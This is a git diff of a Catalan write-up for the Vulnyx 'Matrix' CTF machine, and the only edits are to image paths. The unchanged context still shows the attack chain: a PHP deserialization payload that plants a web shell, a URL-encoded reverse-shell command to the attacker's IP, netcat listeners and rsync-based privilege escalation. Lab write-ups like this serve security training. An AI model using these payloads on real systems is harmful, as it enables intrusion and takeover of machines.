@@ -5,7 +5,7 @@ title: WriteUp Matrix - Vulnyx
 slug: matrix-writeup-vulnyx-ca
 featured: false
 draft: false
-ogImage: "assets/matrix/OpenGraph.png"
+ogImage: "../../../assets/images/matrix/OpenGraph.png"
 tags:
   - writeup
   - vulnyx
@@ -18,7 +18,7 @@ description:
 lang: ca
 ---
 
-![Conill a Matrix](/assets/matrix/OpenGraph.png)
+![Conill a Matrix](../../../assets/images/matrix/OpenGraph.png)
 
 Aquest writeup documenta l'explotació d'una màquina vulnerable inspirada en Matrix, utilitzant anàlisi de trànsit, injecció PHP i escalada de privilegis amb rsync per obtenir accés root.
 
@@ -60,11 +60,11 @@ Veiem dos ports oberts, el 22 per al servei SSH i el port 80 per al servei Web.
 
 Accedim amb el navegador al servei web.
 
-![alt text](/assets/matrix/image-1.png)
+![alt text](../../../assets/images/matrix/image-1.png)
 
 Dins del codi font trobem un comentari amb una pista.
 
-![alt text](/assets/matrix/image-2.png)
+![alt text](../../../assets/images/matrix/image-2.png)
 
 `Follow the red rabbit... Is it a dream or a clue? Within the saved traffic, you may find traces of the Matrix. Could it be a .pcap file ready to fuzz?`
 
@@ -74,7 +74,7 @@ Així que, sense dubtar-ho, fem fuzzing del servei web a la recerca d'un fitxer 
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.168 -x .pcap,.php,.txt,.zip,.db
 ```
 
-![alt text](/assets/matrix/image-3.png)
+![alt text](../../../assets/images/matrix/image-3.png)
 
 Trobem un fitxer `trinity.pcap`.
 
@@ -90,9 +90,9 @@ Trobem molts usuaris, contrasenyes i subdominis de diferents serveis (FTP, RSYNC
 
 Detectem que es transfereix una imatge mitjançant HTTP, intentem exportar-la del tràfic mitjançant Wireshark.
 
-![alt text](/assets/matrix/image-4.png)
+![alt text](../../../assets/images/matrix/image-4.png)
 
-![alt text](/assets/matrix/image-5.png)
+![alt text](../../../assets/images/matrix/image-5.png)
 
 Un cop descarregada, la reanomenem i analitzem les metadades amb l'eina `exiftool`.
 
@@ -118,7 +118,7 @@ Trobem un comentari molt interessant en la metadada `Description`, on es filtra 
 Morpheus, we have found a direct connection to the 'Mind', the artificial intelligence that controls the Matrix. You can find it at the domain M47r1X.matrix.nyx.
 ```
 
-![alt text](/assets/matrix/image-7.png)
+![alt text](../../../assets/images/matrix/image-7.png)
 
 Altres formes d'obtenir aquest subdomini i altres dades sensibles del fitxer pcap és analitzant el tràfic en el mateix Wireshark o amb les comandes `strings` i `grep`.
 
@@ -139,7 +139,7 @@ M47r1X.matrix.nyx
 
 Més informació en el fitxer .pcap ...
 
-![alt text](/assets/matrix/image-6.png)
+![alt text](../../../assets/images/matrix/image-6.png)
 
 Subdominis que no ens serveixen, el que sí que funciona és `M47r1X.matrix.nyx`, que conté un virtualhost. L'afegim al nostre fitxer hosts.
 
@@ -147,15 +147,15 @@ Subdominis que no ens serveixen, el que sí que funciona és `M47r1X.matrix.nyx`
 
 Accedim al virtualhost `M47r1X.matrix.nyx` amb el navegador per accedir a **La Ment** de Matrix ;)
 
-![alt text](/assets/matrix/image-8.png)
+![alt text](../../../assets/images/matrix/image-8.png)
 
 Si enviem missatges, el xat sempre respon amb símbols estranys, però hi ha una opció aleatòria que pot respondre amb una pista:
 
-![alt text](/assets/matrix/image-9.png)
+![alt text](../../../assets/images/matrix/image-9.png)
 
 Obtenim el fitxer amb la filtració del backend.
 
-![alt text](/assets/matrix/image-10.png)
+![alt text](../../../assets/images/matrix/image-10.png)
 
 En el codi de la pàgina hi ha un comentari i codi en el javascript que ens dona més pistes sobre com funciona la intrusió, a més del possible missatge que mostra la filtració del backend.
 
@@ -171,7 +171,7 @@ En el codi de la pàgina hi ha un comentari i codi en el javascript que ens dona
 
 Utilitzem BurpSuite per facilitar la intrusió. Enviem el missatge `test` i comprovem que envia un objecte serialitzat en PHP, que segurament es deserialitzarà en el servidor amb la classe PHP filtrada.
 
-![alt text](/assets/matrix/image-11.png)
+![alt text](../../../assets/images/matrix/image-11.png)
 
 ```bash
 O:7:"Message":1:{s:7:"message";s:4:"test";}
@@ -205,11 +205,11 @@ Executem el codi i això és el que enviarem:
 O:7:"Message":2:{s:4:"file";s:9:"shell.php";s:7:"message";s:33:"<?php echo exec($_GET[\"cmd\"]); ?>";}
 ```
 
-![alt text](/assets/matrix/image-12.png)
+![alt text](../../../assets/images/matrix/image-12.png)
 
 Ara ja tenim un RCE amb el fitxer `shell.php` creat mitjançant la deserialització del missatge en PHP.
 
-![alt text](/assets/matrix/image-13.png)
+![alt text](../../../assets/images/matrix/image-13.png)
 
 Creem una revshell en PHP, la IP `192.168.1.116` és la de la nostra màquina atacant.
 
@@ -227,7 +227,7 @@ nc -lvnp 443
 wget http://m47r1x.matrix.nyx/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.1.116%22%2C443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
 ```
 
-![alt text](/assets/matrix/image-14.png)
+![alt text](../../../assets/images/matrix/image-14.png)
 
 Ja som l'usuari `www-data`.
 
@@ -289,7 +289,7 @@ Introduïm la contrasenya filtrada i ja som `smith`.
 
 La forma més complicada: si utilitzem `pspy64` o qualsevol altra eina, podem mirar els processos que s'executen amb l'usuari `smith`.
 
-![alt text](/assets/matrix/image-15.png)
+![alt text](../../../assets/images/matrix/image-15.png)
 
 Podem observar que hi ha una tasca programada que s'executa cada minut.
 
@@ -328,7 +328,7 @@ nc -lvnp 12345
 
 I en un minut obtenim una shell amb l'usuari `smith`.
 
-![alt text](/assets/matrix/image-16.png)
+![alt text](../../../assets/images/matrix/image-16.png)
 
 ### smith to root (sudo rsync)
 
@@ -384,7 +384,7 @@ User smith may run the following commands on matrix:
 
 Podem executar `rsync` com a usuari root. Gràcies a `gtfobins` trobem una forma d'escalar a root.
 
-![alt text](/assets/matrix/image-17.png)
+![alt text](../../../assets/images/matrix/image-17.png)
 
 Ho executem i obtenim shell com a root, i llegim la flag.
 
